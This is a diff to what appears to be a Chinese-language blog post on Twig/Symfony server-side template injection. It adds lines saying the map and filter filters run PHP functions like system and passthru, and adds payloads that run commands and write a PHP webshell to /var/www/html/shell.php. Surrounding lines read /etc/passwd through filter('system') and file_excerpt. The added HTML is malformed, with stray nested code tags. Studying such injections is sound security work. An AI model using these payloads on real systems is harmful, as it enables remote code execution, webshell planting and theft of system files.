@@ -568,6 +568,10 @@ a,b,c
 {{ 'das'|upper}}</code></pre><h4 id="map"><a href="#map" class="headerlink" title="map"></a>map</h4><p>就是数组内的映射的筛选</p>
 <pre><code>{{[{a:1,b:2},{a:3,b:4}]|map(i=&gt; "#{i.a}")|join('') }}</code></pre><p>得到 <code>13</code></p>
 <p><code>"{i.a}"</code> 这个引号需要是 双引号</p>
+<p>更有用的一点是，允许用户传一个<code>function</code></p>
+<p>可以是 <code>system</code> ，<code>passthru</code>，<code>exec</code> ,<code>popen</code>,</p>
+<p><code>shell_exec</code> ，<code>file_put_contents</code>等等</p>
+<p>那样就可以任意函数执行了</p>
 <h4 id="merge-和php的一样"><a href="#merge-和php的一样" class="headerlink" title="merge 和php的一样"></a>merge 和php的一样</h4><p>数组合并</p>
 <pre><code>{{ [1,2]|merge([3,4])|join(',')}}
 1,2,3,4</code></pre><h4 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h4><pre><code>{{"abcdef "|replace({'a':'first','e':'haha'})}}
@@ -608,7 +612,9 @@ http://127.0.0.1:8000/_profiler/open?file=/tmp/111&amp;amp;line=1#line1 </code><
 <p>这个我试过报错了</p>
 <pre><code>{{['cat${IFS}/etc/passwd']|filter('system')}}</code></pre><p>因为是数组，所以报错，所以应该拼接</p>
 <p><strong>所以正确的应该是</strong></p>
-<pre><code>{{['cat${IFS}/etc/passwd']|filter('system')|join('')}}</code></pre><h3 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h3><p>仅仅 </p>
+<pre><code>{{['cat${IFS}/etc/passwd']|filter('system')|join('')}}</code></pre><p>或者</p>
+<pre><code>
+{{['id']|map('passthru')}}"@aaa.bbb</code></pre><h3 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h3><p>仅仅 </p>
 <pre><code>{{app.request.files.get(key}}</code></pre><p>得到的是 临时文件名字</p>
 <p><strong>然后下面是文件写入</strong></p>
 <p>需要使用 multipart 文件上传</p>
@@ -654,9 +660,10 @@ Content-Disposition: form-data; name="email"
 </code></pre><p>文件目录可以的情况下如果没有 <code>/tmp/000</code>，就会创建文件夹</p>
 <p>然后得到的是一个临时文件名</p>
 <p><code>/tmp/000/phpdEjxsR</code></p>
-<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><pre><code>{{'/etc/passwd'|file_excerpt(1,30)}}
+<p>或者 另外一种</p>
+<pre><code>{{{"<!--?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}</code--></code></pre><h3 id="任意文件读取"><code><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</code></h3><pre><code><code>{{'/etc/passwd'|file_excerpt(1,30)}}
 
-{{'/etc/passwd'|file_excerpt(0,-1)}}</code></pre><p>或者</p>
+{{'/etc/passwd'|file_excerpt(0,-1)}}</code></code></pre><p><code>或者</code></p><code>
 <pre><code>{{app.request.files.get('file').__construct('/etc/passwd','')}}
 {{app.request.files.get('file').openFile.fread(99)}}
 </code></pre><p>这两个需要在同一个请求连着一起用，就可以读取 <code>/etc/passwd</code>的内容了，读取<code>99</code>个字节</p>
@@ -694,7 +701,7 @@ dasd
 <p><a href="https://symfony.com/legacy/doc/jobeet/1_2/cn/01?orm=Propel" target="_blank" rel="noopener">https://symfony.com/legacy/doc/jobeet/1_2/cn/01?orm=Propel</a></p>
 <p><a href="https://geek-docs.com/php/symfony-tutorial/symfony-tutorial.html" target="_blank" rel="noopener">https://geek-docs.com/php/symfony-tutorial/symfony-tutorial.html</a></p>
 <p><a href="https://twig.symfony.com/doc/3.x/templates.html" target="_blank" rel="noopener">https://twig.symfony.com/doc/3.x/templates.html</a></p>
-<script>
+</code><script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
